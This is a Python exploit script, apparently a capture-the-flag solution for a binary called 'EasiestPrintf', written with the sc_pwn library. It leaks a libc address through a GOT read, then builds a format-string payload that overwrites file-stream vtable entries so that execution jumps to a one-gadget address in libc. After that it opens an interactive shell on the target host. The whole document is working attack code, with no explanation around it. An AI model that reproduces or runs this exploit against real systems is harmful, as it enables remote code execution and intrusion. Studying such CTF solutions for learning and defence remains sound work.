#!/usr/bin/env python
# https://github.com/shift-crops/sc_pwn/blob/master/sc_pwn.py
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('mode',    local = 'SOCKET', remote = 'SOCKET')
env.set_item('target',  local   = {'host':'192.168.92.129','port':8080}, \
                        remote  = {'host':'202.120.7.210','port':12321})
env.select()

libc = ELF('libc.so.6_0ed9bad239c74870ed2db31c735132ce')
binf = ELF('EasiestPrintf')
addr_got_main       = binf.got('__libc_start_main')
addr_main           = binf.function('main')

#==========
def attack(cmn):
    sleep(3)
    cmn.read_until('read:\n')
    cmn.sendln(str(addr_got_main))
    addr_libc_main  = int(cmn.read_until(),16)
    libc.set_location('__libc_start_main', addr_libc_main)
    addr_libc_rce       = libc.base + 0x64c75
    addr_vtables        = libc.base + 0x1aa000

    fsb = FSB()
    fsb.set_adrval(addr_vtables+0x1c, addr_main+0x30)   # xsputn (printf)
    fsb.set_adrval(addr_vtables+0x2c, addr_libc_rce)    # setbuf (setvbuf)
    fsb.auto_write(index=7)

    exploit  = fsb.get()
    exploit += fsb.write(5,addr_vtables&0xffff)
    cmn.read_until('Good Bye\n')
    cmn.sendln(exploit)

    cmn.read_all()
        
#==========

if __name__=='__main__':
    cmn = Communicate(env.target, env.mode)
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)
    #Interact(cmn).worker(False)
    
    del(cmn)
    
#==========
